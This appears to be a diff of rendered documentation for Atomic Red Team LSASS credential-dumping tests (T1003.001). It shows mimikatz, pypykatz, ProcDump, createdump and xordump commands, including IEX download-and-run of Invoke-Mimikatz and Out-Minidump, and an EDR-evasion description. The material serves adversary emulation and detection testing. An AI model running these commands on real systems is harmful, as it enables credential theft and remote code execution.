+<div class="highlight-cmd notranslate"><div class="highlight"><pre><span></span>if (Test-Path PathToAtomicsFolder\T1003.001\bin\x64\mimikatz.exe) {exit 0} else {exit 1}
+
 </pre></div>
 </div>
 </section>
-<section id="id11">
-<h5>Get Prereq Commands:<a class="headerlink" href="#id11" title="Permalink to this headline">#</a></h5>
-<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="no">[Net.ServicePointManager]</span><span class="p">::</span><span class="n">SecurityProtocol</span> <span class="p">=</span> <span class="no">[Net.SecurityProtocolType]</span><span class="p">::</span><span class="n">Tls12</span>
-<span class="nb">IEX </span><span class="p">(</span><span class="nb">iwr </span><span class="s2">&quot;https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1&quot;</span> <span class="n">-UseBasicParsing</span><span class="p">)</span> 
-<span class="nv">$releases</span> <span class="p">=</span> <span class="s2">&quot;https://api.github.com/repos/gentilkiwi/mimikatz/releases&quot;</span>
-<span class="nv">$zipUrl</span> <span class="p">=</span> <span class="p">(</span><span class="nb">Invoke-WebRequest</span> <span class="nv">$releases</span> <span class="p">|</span> <span class="nb">ConvertFrom-Json</span><span class="p">)[</span><span class="n">0</span><span class="p">].</span><span class="n">assets</span><span class="p">.</span><span class="n">browser_download_url</span> <span class="p">|</span> <span class="nb">where-object</span> <span class="p">{</span> <span class="nv">$_</span><span class="p">.</span><span class="n">endswith</span><span class="p">(</span><span class="s2">&quot;.zip&quot;</span><span class="p">)</span> <span class="p">}</span>
-<span class="nv">$basePath</span> <span class="p">=</span> <span class="nb">Split-Path</span> <span class="n">PathToAtomicsFolder</span><span class="p">\</span><span class="n">T1003</span><span class="p">.</span><span class="n">001</span><span class="p">\</span><span class="n">bin</span><span class="p">\</span><span class="n">x64</span><span class="p">\</span><span class="n">mimikatz</span><span class="p">.</span><span class="n">exe</span> <span class="p">|</span> <span class="nb">Split-Path</span>
-<span class="nb">Invoke-FetchFromZip</span> <span class="nv">$zipUrl</span> <span class="s2">&quot;x64/mimikatz.exe&quot;</span> <span class="nv">$basePath</span>
+<section id="id14">
+<h5>Get Prereq Commands:<a class="headerlink" href="#id14" title="Permalink to this headline">#</a></h5>
+<div class="highlight-cmd notranslate"><div class="highlight"><pre><span></span>[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+IEX (iwr &quot;https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1&quot; -UseBasicParsing) 
+$releases = &quot;https://api.github.com/repos/gentilkiwi/mimikatz/releases&quot;
+$zipUrl = (Invoke-WebRequest $releases | ConvertFrom-Json)[0].assets.browser_download_url | where-object { $_.endswith(&quot;.zip&quot;) }
+$basePath = Split-Path PathToAtomicsFolder\T1003.001\bin\x64\mimikatz.exe | Split-Path
+Invoke-FetchFromZip $zipUrl &quot;x64/mimikatz.exe&quot; $basePath
+
 </pre></div>
 </div>
 </section>
 <section id="description-lsass-dump-must-exist-at-specified-location-input-file">
 <h5>Description: Lsass dump must exist at specified location (#{input_file})<a class="headerlink" href="#description-lsass-dump-must-exist-at-specified-location-input-file" title="Permalink to this headline">#</a></h5>
 </section>
-<section id="id12">
-<h5>Check Prereq Commands:<a class="headerlink" href="#id12" title="Permalink to this headline">#</a></h5>
-<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="n">cmd</span> <span class="p">/</span><span class="n">c</span> <span class="s2">&quot;if not exist %tmp%\lsass.DMP (exit /b 1)&quot;</span>
+<section id="id15">
+<h5>Check Prereq Commands:<a class="headerlink" href="#id15" title="Permalink to this headline">#</a></h5>
+<div class="highlight-cmd notranslate"><div class="highlight"><pre><span></span>cmd /c &quot;if not exist %tmp%\lsass.DMP (exit /b 1)&quot;
+
 </pre></div>
 </div>
 </section>
-<section id="id13">
-<h5>Get Prereq Commands:<a class="headerlink" href="#id13" title="Permalink to this headline">#</a></h5>
-<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Write-Host</span> <span class="s2">&quot;Create the lsass dump manually using the steps in the previous test (Dump LSASS.exe Memory using Windows Task Manager)&quot;</span>
+<section id="id16">
+<h5>Get Prereq Commands:<a class="headerlink" href="#id16" title="Permalink to this headline">#</a></h5>
+<div class="highlight-cmd notranslate"><div class="highlight"><pre><span></span>Write-Host &quot;Create the lsass dump manually using the steps in the previous test (Dump LSASS.exe Memory using Windows Task Manager)&quot;
+
 </pre></div>
 </div>
 <div class="cell docutils container">
@@ -6072,8 +6143,8 @@ Elevation Required (e.g. root or admin)</p>
 </div>
 </section>
 </section>
-<section id="id14">
-<h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">command_prompt</span></code><a class="headerlink" href="#id14" title="Permalink to this headline">#</a></h4>
+<section id="id17">
+<h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">command_prompt</span></code><a class="headerlink" href="#id17" title="Permalink to this headline">#</a></h4>
 <div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>PathToAtomicsFolder\T1003.001\bin\x64\mimikatz.exe &quot;sekurlsa::minidump %tmp%\lsass.DMP&quot; &quot;sekurlsa::logonpasswords full&quot; exit
 </pre></div>
 </div>
@@ -6091,24 +6162,24 @@ Elevation Required (e.g. root or admin)</p>
 <p>Parses secrets hidden in the LSASS process with python. Similar to mimikatz’s sekurlsa::</p>
 <p>Python 3 must be installed, use the get_prereq_command’s to meet the prerequisites for this test.</p>
 <p>Successful execution of this test will display multiple useranames and passwords/hashes to the screen.</p>
-<p><strong>Supported Platforms:</strong> windows
-Elevation Required (e.g. root or admin)</p>
+<p><strong>Supported Platforms:</strong> windows</p>
+<p>Elevation Required (e.g. root or admin)</p>
 <section id="dependencies-run-with-command-prompt">
 <h4>Dependencies:  Run with <code class="docutils literal notranslate"><span class="pre">command_prompt</span></code>!<a class="headerlink" href="#dependencies-run-with-command-prompt" title="Permalink to this headline">#</a></h4>
 <section id="description-computer-must-have-python-3-installed">
 <h5>Description: Computer must have python 3 installed<a class="headerlink" href="#description-computer-must-have-python-3-installed" title="Permalink to this headline">#</a></h5>
 </section>
-<section id="id15">
-<h5>Check Prereq Commands:<a class="headerlink" href="#id15" title="Permalink to this headline">#</a></h5>
-<div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>py -3 --version &gt;nul 2&gt;&amp;1
+<section id="id18">
+<h5>Check Prereq Commands:<a class="headerlink" href="#id18" title="Permalink to this headline">#</a></h5>
+<div class="highlight-cmd notranslate"><div class="highlight"><pre><span></span>py -3 --version &gt;nul 2&gt;&amp;1
 exit /b %errorlevel%
 
 </pre></div>
 </div>
 </section>
-<section id="id16">
-<h5>Get Prereq Commands:<a class="headerlink" href="#id16" title="Permalink to this headline">#</a></h5>
-<div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>echo &quot;Python 3 must be installed manually&quot;
+<section id="id19">
+<h5>Get Prereq Commands:<a class="headerlink" href="#id19" title="Permalink to this headline">#</a></h5>
+<div class="highlight-cmd notranslate"><div class="highlight"><pre><span></span>echo &quot;Python 3 must be installed manually&quot;
 
 </pre></div>
 </div>
@@ -6116,17 +6187,17 @@ exit /b %errorlevel%
 <section id="description-computer-must-have-pip-installed">
 <h5>Description: Computer must have pip installed<a class="headerlink" href="#description-computer-must-have-pip-installed" title="Permalink to this headline">#</a></h5>
 </section>
-<section id="id17">
-<h5>Check Prereq Commands:<a class="headerlink" href="#id17" title="Permalink to this headline">#</a></h5>
-<div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>py -3 -m pip --version &gt;nul 2&gt;&amp;1
+<section id="id20">
+<h5>Check Prereq Commands:<a class="headerlink" href="#id20" title="Permalink to this headline">#</a></h5>
+<div class="highlight-cmd notranslate"><div class="highlight"><pre><span></span>py -3 -m pip --version &gt;nul 2&gt;&amp;1
 exit /b %errorlevel%
 
 </pre></div>
 </div>
 </section>
-<section id="id18">
-<h5>Get Prereq Commands:<a class="headerlink" href="#id18" title="Permalink to this headline">#</a></h5>
-<div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>echo &quot;PIP must be installed manually&quot;
+<section id="id21">
+<h5>Get Prereq Commands:<a class="headerlink" href="#id21" title="Permalink to this headline">#</a></h5>
+<div class="highlight-cmd notranslate"><div class="highlight"><pre><span></span>echo &quot;PIP must be installed manually&quot;
 
 </pre></div>
 </div>
@@ -6134,17 +6205,17 @@ exit /b %errorlevel%
 <section id="description-pypykatz-must-be-installed-and-part-of-path">
 <h5>Description: pypykatz must be installed and part of PATH<a class="headerlink" href="#description-pypykatz-must-be-installed-and-part-of-path" title="Permalink to this headline">#</a></h5>
 </section>
-<section id="id19">
-<h5>Check Prereq Commands:<a class="headerlink" href="#id19" title="Permalink to this headline">#</a></h5>
-<div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>pypykatz -h &gt;nul 2&gt;&amp;1
+<section id="id22">
+<h5>Check Prereq Commands:<a class="headerlink" href="#id22" title="Permalink to this headline">#</a></h5>
+<div class="highlight-cmd notranslate"><div class="highlight"><pre><span></span>pypykatz -h &gt;nul 2&gt;&amp;1
 exit /b %errorlevel%
 
 </pre></div>
 </div>
 </section>
-<section id="id20">
-<h5>Get Prereq Commands:<a class="headerlink" href="#id20" title="Permalink to this headline">#</a></h5>
-<div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>pip install pypykatz
+<section id="id23">
+<h5>Get Prereq Commands:<a class="headerlink" href="#id23" title="Permalink to this headline">#</a></h5>
+<div class="highlight-cmd notranslate"><div class="highlight"><pre><span></span>pip install pypykatz
 
 </pre></div>
 </div>
@@ -6157,8 +6228,8 @@ exit /b %errorlevel%
 </div>
 </section>
 </section>
-<section id="id21">
-<h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">command_prompt</span></code><a class="headerlink" href="#id21" title="Permalink to this headline">#</a></h4>
+<section id="id24">
+<h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">command_prompt</span></code><a class="headerlink" href="#id24" title="Permalink to this headline">#</a></h4>
 <div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>pypykatz live lsa
 </pre></div>
 </div>
@@ -6171,15 +6242,12 @@ exit /b %errorlevel%
 </div>
 </section>
 </section>
-<section id="atomic-test-8-dump-lsass-exe-memory-using-out-minidump-ps1">
-<h3>Atomic Test #8 - Dump LSASS.exe Memory using Out-Minidump.ps1<a class="headerlink" href="#atomic-test-8-dump-lsass-exe-memory-using-out-minidump-ps1" title="Permalink to this headline">#</a></h3>
-<p>The memory of lsass.exe is often dumped for offline credential theft attacks. This test leverages a pure
-powershell implementation that leverages the MiniDumpWriteDump Win32 API call.
-Upon successful execution, you should see the following file created $env:SYSTEMROOT\System32\lsass_*.dmp.</p>
-<p><strong>Supported Platforms:</strong> windows
-Elevation Required (e.g. root or admin)</p>
-<section id="id22">
-<h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code><a class="headerlink" href="#id22" title="Permalink to this headline">#</a></h4>
+<section id="atomic-test-8-dump-lsass-exe-memory-using-out-minidump-ps1the-memory-of-lsass-exe-is-often-dumped-for-offline-credential-theft-attacks-this-test-leverages-a-pure">
+<h3>Atomic Test #8 - Dump LSASS.exe Memory using Out-Minidump.ps1The memory of lsass.exe is often dumped for offline credential theft attacks. This test leverages a pure<a class="headerlink" href="#atomic-test-8-dump-lsass-exe-memory-using-out-minidump-ps1the-memory-of-lsass-exe-is-often-dumped-for-offline-credential-theft-attacks-this-test-leverages-a-pure" title="Permalink to this headline">#</a></h3>
+<p>powershell implementation that leverages the MiniDumpWriteDump Win32 API call.
+Upon successful execution, you should see the following file created $env:SYSTEMROOT\System32\lsass_*.dmp.
+<strong>Supported Platforms:</strong> windows
+Elevation Required (e.g. root or admin)#### Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code></p>
 <div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="no">[Net.ServicePointManager]</span><span class="p">::</span><span class="n">SecurityProtocol</span> <span class="p">=</span> <span class="no">[Net.SecurityProtocolType]</span><span class="p">::</span><span class="n">Tls12</span>
 <span class="nb">IEX </span><span class="p">(</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="n">DownloadString</span><span class="p">(</span><span class="s1">&#39;https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Out-Minidump.ps1&#39;</span><span class="p">);</span> <span class="nb">get-process</span> <span class="n">lsass</span> <span class="p">|</span> <span class="nb">Out-Minidump</span>
 </pre></div>
@@ -6187,6 +6255,18 @@ Elevation Required (e.g. root or admin)</p>
 <div class="cell docutils container">
 <div class="cell_input docutils container">
 <div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Invoke-AtomicTest</span> <span class="n">T1003</span><span class="p">.</span><span class="n">001</span> <span class="n">-TestNumbers</span> <span class="n">8</span>
+</pre></div>
+</div>
+</div>
+</div>
+<section id="id25">
+<h4>Cleanup:<a class="headerlink" href="#id25" title="Permalink to this headline">#</a></h4>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Remove-Item</span> <span class="nv">$env:TEMP</span><span class="p">\</span><span class="n">lsass_</span><span class="p">*.</span><span class="n">dmp</span> <span class="n">-ErrorAction</span> <span class="n">Ignore</span>
+</pre></div>
+</div>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Invoke-AtomicTest</span> <span class="n">T1003</span><span class="p">.</span><span class="n">001</span> <span class="n">-TestNumbers</span> <span class="n">8</span> <span class="n">-Cleanup</span>
 </pre></div>
 </div>
 </div>
@@ -6199,25 +6279,27 @@ Elevation Required (e.g. root or admin)</p>
 ProcDump. This particular method uses -mm to produce a mini dump of lsass.exe</p>
 <p>Upon successful execution, you should see the following file created c:\windows\temp\lsass_dump.dmp.</p>
 <p>If you see a message saying “procdump.exe is not recognized as an internal or external command”, try using the  get-prereq_commands to download and install the ProcDump tool first.</p>
-<p><strong>Supported Platforms:</strong> windows
-Elevation Required (e.g. root or admin)</p>
-<section id="id23">
-<h4>Dependencies:  Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code>!<a class="headerlink" href="#id23" title="Permalink to this headline">#</a></h4>
-<section id="id24">
-<h5>Description: ProcDump tool from Sysinternals must exist on disk at specified location (#{procdump_exe})<a class="headerlink" href="#id24" title="Permalink to this headline">#</a></h5>
+<p><strong>Supported Platforms:</strong> windows</p>
+<p>Elevation Required (e.g. root or admin)</p>
+<section id="id26">
+<h4>Dependencies:  Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code>!<a class="headerlink" href="#id26" title="Permalink to this headline">#</a></h4>
+<section id="id27">
+<h5>Description: ProcDump tool from Sysinternals must exist on disk at specified location (#{procdump_exe})<a class="headerlink" href="#id27" title="Permalink to this headline">#</a></h5>
 </section>
-<section id="id25">
-<h5>Check Prereq Commands:<a class="headerlink" href="#id25" title="Permalink to this headline">#</a></h5>
-<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="k">if</span> <span class="p">(</span><span class="nb">Test-Path</span> <span class="n">PathToAtomicsFolder</span><span class="p">\</span><span class="n">T1003</span><span class="p">.</span><span class="n">001</span><span class="p">\</span><span class="n">bin</span><span class="p">\</span><span class="n">procdump</span><span class="p">.</span><span class="n">exe</span><span class="p">)</span> <span class="p">{</span><span class="n">exit</span> <span class="n">0</span><span class="p">}</span> <span class="k">else</span> <span class="p">{</span><span class="n">exit</span> <span class="n">1</span><span class="p">}</span>
+<section id="id28">
+<h5>Check Prereq Commands:<a class="headerlink" href="#id28" title="Permalink to this headline">#</a></h5>
+<div class="highlight-cmd notranslate"><div class="highlight"><pre><span></span>if (Test-Path PathToAtomicsFolder\T1003.001\bin\procdump.exe) {exit 0} else {exit 1}
+
 </pre></div>
 </div>
 </section>
-<section id="id26">
-<h5>Get Prereq Commands:<a class="headerlink" href="#id26" title="Permalink to this headline">#</a></h5>
-<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Invoke-WebRequest</span> <span class="s2">&quot;https://download.sysinternals.com/files/Procdump.zip&quot;</span> <span class="n">-OutFile</span> <span class="s2">&quot;$env:TEMP\Procdump.zip&quot;</span>
-<span class="nb">Expand-Archive</span> <span class="nv">$env:TEMP</span><span class="p">\</span><span class="n">Procdump</span><span class="p">.</span><span class="n">zip</span> <span class="nv">$env:TEMP</span><span class="p">\</span><span class="n">Procdump</span> <span class="n">-Force</span>
-<span class="nb">New-Item</span> <span class="n">-ItemType</span> <span class="n">Directory</span> <span class="p">(</span><span class="nb">Split-Path</span> <span class="n">PathToAtomicsFolder</span><span class="p">\</span><span class="n">T1003</span><span class="p">.</span><span class="n">001</span><span class="p">\</span><span class="n">bin</span><span class="p">\</span><span class="n">procdump</span><span class="p">.</span><span class="n">exe</span><span class="p">)</span> <span class="n">-Force</span> <span class="p">|</span> <span class="nb">Out-Null</span>
-<span class="nb">Copy-Item</span> <span class="nv">$env:TEMP</span><span class="p">\</span><span class="n">Procdump</span><span class="p">\</span><span class="n">Procdump</span><span class="p">.</span><span class="n">exe</span> <span class="n">PathToAtomicsFolder</span><span class="p">\</span><span class="n">T1003</span><span class="p">.</span><span class="n">001</span><span class="p">\</span><span class="n">bin</span><span class="p">\</span><span class="n">procdump</span><span class="p">.</span><span class="n">exe</span> <span class="n">-Force</span>
+<section id="id29">
+<h5>Get Prereq Commands:<a class="headerlink" href="#id29" title="Permalink to this headline">#</a></h5>
+<div class="highlight-cmd notranslate"><div class="highlight"><pre><span></span>Invoke-WebRequest &quot;https://download.sysinternals.com/files/Procdump.zip&quot; -OutFile &quot;$env:TEMP\Procdump.zip&quot;
+Expand-Archive $env:TEMP\Procdump.zip $env:TEMP\Procdump -Force
+New-Item -ItemType Directory (Split-Path PathToAtomicsFolder\T1003.001\bin\procdump.exe) -Force | Out-Null
+Copy-Item $env:TEMP\Procdump\Procdump.exe PathToAtomicsFolder\T1003.001\bin\procdump.exe -Force
+
 </pre></div>
 </div>
 <div class="cell docutils container">
@@ -6229,8 +6311,8 @@ Elevation Required (e.g. root or admin)</p>
 </div>
 </section>
 </section>
-<section id="id27">
-<h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">command_prompt</span></code><a class="headerlink" href="#id27" title="Permalink to this headline">#</a></h4>
+<section id="id30">
+<h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">command_prompt</span></code><a class="headerlink" href="#id30" title="Permalink to this headline">#</a></h4>
 <div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>PathToAtomicsFolder\T1003.001\bin\procdump.exe -accepteula -mm lsass.exe C:\Windows\Temp\lsass_dump.dmp
 </pre></div>
 </div>
@@ -6242,17 +6324,27 @@ Elevation Required (e.g. root or admin)</p>
 </div>
 </div>
 </section>
+<section id="id31">
+<h4>Cleanup:<a class="headerlink" href="#id31" title="Permalink to this headline">#</a></h4>
+<div class="highlight-cmd notranslate"><div class="highlight"><pre><span></span>del &quot;C:\Windows\Temp\lsass_dump.dmp&quot; &gt;nul 2&gt; nul
+</pre></div>
+</div>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Invoke-AtomicTest</span> <span class="n">T1003</span><span class="p">.</span><span class="n">001</span> <span class="n">-TestNumbers</span> <span class="n">9</span> <span class="n">-Cleanup</span>
+</pre></div>
+</div>
+</div>
+</div>
 </section>
-<section id="atomic-test-10-powershell-mimikatz">
-<h3>Atomic Test #10 - Powershell Mimikatz<a class="headerlink" href="#atomic-test-10-powershell-mimikatz" title="Permalink to this headline">#</a></h3>
-<p>Dumps credentials from memory via Powershell by invoking a remote mimikatz script.
-If Mimikatz runs successfully you will see several usernames and hashes output to the screen.
+</section>
+<section id="atomic-test-10-powershell-mimikatzdumps-credentials-from-memory-via-powershell-by-invoking-a-remote-mimikatz-script">
+<h3>Atomic Test #10 - Powershell MimikatzDumps credentials from memory via Powershell by invoking a remote mimikatz script.<a class="headerlink" href="#atomic-test-10-powershell-mimikatzdumps-credentials-from-memory-via-powershell-by-invoking-a-remote-mimikatz-script" title="Permalink to this headline">#</a></h3>
+<p>If Mimikatz runs successfully you will see several usernames and hashes output to the screen.
 Common failures include seeing an “access denied” error which results when Anti-Virus blocks execution.
-Or, if you try to run the test without the required administrative privleges you will see this error near the bottom of the output to the screen “ERROR kuhl_m_sekurlsa_acquireLSA”</p>
-<p><strong>Supported Platforms:</strong> windows
-Elevation Required (e.g. root or admin)</p>
-<section id="id28">
-<h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code><a class="headerlink" href="#id28" title="Permalink to this headline">#</a></h4>
+Or, if you try to run the test without the required administrative privleges you will see this error near the bottom of the output to the screen “ERROR kuhl_m_sekurlsa_acquireLSA”
+<strong>Supported Platforms:</strong> windows
+Elevation Required (e.g. root or admin)#### Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code></p>
 <div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">IEX </span><span class="p">(</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="n">DownloadString</span><span class="p">(</span><span class="s1">&#39;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1&#39;</span><span class="p">);</span> <span class="nb">Invoke-Mimikatz</span> <span class="n">-DumpCreds</span>
 </pre></div>
 </div>
@@ -6264,27 +6356,26 @@ Elevation Required (e.g. root or admin)</p>
 </div>
 </div>
 </section>
-</section>
 <section id="atomic-test-11-dump-lsass-with-createdump-exe-from-net-v5">
 <h3>Atomic Test #11 - Dump LSASS with createdump.exe from .Net v5<a class="headerlink" href="#atomic-test-11-dump-lsass-with-createdump-exe-from-net-v5" title="Permalink to this headline">#</a></h3>
 <p>Use createdump executable from .NET to create an LSASS dump.</p>
 <p><a class="reference external" href="https://twitter.com/bopin2020/status/1366400799199272960?s=20">Reference</a></p>
-<p><strong>Supported Platforms:</strong> windows
-Elevation Required (e.g. root or admin)</p>
-<section id="id29">
-<h4>Dependencies:  Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code>!<a class="headerlink" href="#id29" title="Permalink to this headline">#</a></h4>
+<p><strong>Supported Platforms:</strong> windows</p>
+<p>Elevation Required (e.g. root or admin)</p>
+<section id="id32">
+<h4>Dependencies:  Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code>!<a class="headerlink" href="#id32" title="Permalink to this headline">#</a></h4>
 <section id="description-net-v5-must-be-installed">
 <h5>Description: .Net v5 must be installed<a class="headerlink" href="#description-net-v5-must-be-installed" title="Permalink to this headline">#</a></h5>
 </section>
-<section id="id30">
-<h5>Check Prereq Commands:<a class="headerlink" href="#id30" title="Permalink to this headline">#</a></h5>
+<section id="id33">
+<h5>Check Prereq Commands:<a class="headerlink" href="#id33" title="Permalink to this headline">#</a></h5>
 <div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nv">$exePath</span> <span class="p">=</span>  <span class="nb">resolve-path</span> <span class="s2">&quot;$env:ProgramFiles\dotnet\shared\Microsoft.NETCore.App\5*\createdump.exe&quot;</span>
 <span class="k">if</span> <span class="p">(</span><span class="nb">Test-Path</span> <span class="nv">$exePath</span><span class="p">)</span> <span class="p">{</span><span class="n">exit</span> <span class="n">0</span><span class="p">}</span> <span class="k">else</span> <span class="p">{</span><span class="n">exit</span> <span class="n">1</span><span class="p">}</span>
 </pre></div>
 </div>
 </section>
-<section id="id31">
-<h5>Get Prereq Commands:<a class="headerlink" href="#id31" title="Permalink to this headline">#</a></h5>
+<section id="id34">
+<h5>Get Prereq Commands:<a class="headerlink" href="#id34" title="Permalink to this headline">#</a></h5>
 <div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="n">winget</span> <span class="n">install</span> <span class="n">Microsoft</span><span class="p">.</span><span class="n">DotNet</span><span class="p">.</span><span class="n">DesktopRuntime</span><span class="p">.</span><span class="n">5</span> <span class="p">-</span><span class="n">-accept-source-agreements</span> <span class="p">-</span><span class="n">-accept-package-agreements</span> <span class="p">-</span><span class="n">-silent</span>
 </pre></div>
 </div>
@@ -6297,8 +6388,8 @@ Elevation Required (e.g. root or admin)</p>
 </div>
 </section>
 </section>
-<section id="id32">
-<h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code><a class="headerlink" href="#id32" title="Permalink to this headline">#</a></h4>
+<section id="attack-commands-run-with-powershell">
+<h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code><a class="headerlink" href="#attack-commands-run-with-powershell" title="Permalink to this headline">#</a></h4>
 <div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nv">$exePath</span> <span class="p">=</span>  <span class="nb">resolve-path</span> <span class="s2">&quot;$env:ProgramFiles\dotnet\shared\Microsoft.NETCore.App\5*\createdump.exe&quot;</span>
 <span class="p">&amp;</span> <span class="s2">&quot;$exePath&quot;</span> <span class="n">-u</span> <span class="o">-f</span> <span class="nv">$env:Temp</span><span class="p">\</span><span class="n">dotnet-lsass</span><span class="p">.</span><span class="n">dmp</span> <span class="p">(</span><span class="nb">Get-Process</span> <span class="n">lsass</span><span class="p">).</span><span class="n">id</span>
 </pre></div>
@@ -6311,6 +6402,19 @@ Elevation Required (e.g. root or admin)</p>
 </div>
 </div>
 </section>
+<section id="id35">
+<h4>Cleanup:<a class="headerlink" href="#id35" title="Permalink to this headline">#</a></h4>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Remove-Item</span> <span class="nv">$env:Temp</span><span class="p">\</span><span class="n">dotnet-lsass</span><span class="p">.</span><span class="n">dmp</span> <span class="n">-ErrorAction</span> <span class="n">Ignore</span>
+</pre></div>
+</div>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">Invoke-AtomicTest</span> <span class="n">T1003</span><span class="p">.</span><span class="n">001</span> <span class="n">-TestNumbers</span> <span class="n">11</span> <span class="n">-Cleanup</span>
+</pre></div>
+</div>
+</div>
+</div>
+</section>
 </section>
 <section id="atomic-test-12-dump-lsass-exe-using-imported-microsoft-dlls">
 <h3>Atomic Test #12 - Dump LSASS.exe using imported Microsoft DLLs<a class="headerlink" href="#atomic-test-12-dump-lsass-exe-using-imported-microsoft-dlls" title="Permalink to this headline">#</a></h3>
@@ -6318,25 +6422,23 @@ Elevation Required (e.g. root or admin)</p>
 importing built-in DLLs and calling exported functions. Xordump will re-read the resulting minidump
 file and delete it immediately to avoid brittle EDR detections that signature lsass minidump files.</p>
 <p>Upon successful execution, you should see the following file created $env:TEMP\lsass-xordump.t1003.001.dmp.</p>
-<p><strong>Supported Platforms:</strong> windows
-Elevation Required (e.g. root or admin)</p>
-<section id="dependencies-run-with-none">
-<h4>Dependencies:  Run with <code class="docutils literal notranslate"><span class="pre">None</span></code>!<a class="headerlink" href="#dependencies-run-with-none" title="Permalink to this headline">#</a></h4>
+<p><strong>Supported Platforms:</strong> windows</p>
+<p>Elevation Required (e.g. root or admin)</p>
+<section id="id36">
+<h4>Dependencies:  Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code>!<a class="headerlink" href="#id36" title="Permalink to this headline">#</a></h4>
 <section id="description-computer-must-have-xordump-exe">
 <h5>Description: Computer must have xordump.exe<a class="headerlink" href="#description-computer-must-have-xordump-exe" title="Permalink to this headline">#</a></h5>
 </section>
-<section id="id33">
-<h5>Check Prereq Commands:<a class="headerlink" href="#id33" title="Permalink to this headline">#</a></h5>
-<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>if (Test-Path &#39;C:\Windows\Temp\xordump.exe&#39;) {exit 0} else {exit 1}
-
+<section id="id37">
+<h5>Check Prereq Commands:<a class="headerlink" href="#id37" title="Permalink to this headline">#</a></h5>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="k">if</span> <span class="p">(</span><span class="nb">Test-Path</span> <span class="s1">&#39;C:\Windows\Temp\xordump.exe&#39;</span><span class="p">)</span> <span class="p">{</span><span class="n">exit</span> <span class="n">0</span><span class="p">}</span> <span class="k">else</span> <span class="p">{</span><span class="n">exit</span> <span class="n">1</span><span class="p">}</span>
 </pre></div>
 </div>
 </section>
-<section id="id34">
-<h5>Get Prereq Commands:<a class="headerlink" href="#id34" title="Permalink to this headline">#</a></h5>
-<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-Invoke-WebRequest &quot;https://github.com/audibleblink/xordump/releases/download/v0.0.1/xordump.exe&quot; -OutFile C:\Windows\Temp\xordump.exe
-
+<section id="id38">
+<h5>Get Prereq Commands:<a class="headerlink" href="#id38" title="Permalink to this headline">#</a></h5>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="no">[Net.ServicePointManager]</span><span class="p">::</span><span class="n">SecurityProtocol</span> <span class="p">=</span> <span class="no">[Net.SecurityProtocolType]</span><span class="p">::</span><span class="n">Tls12</span>
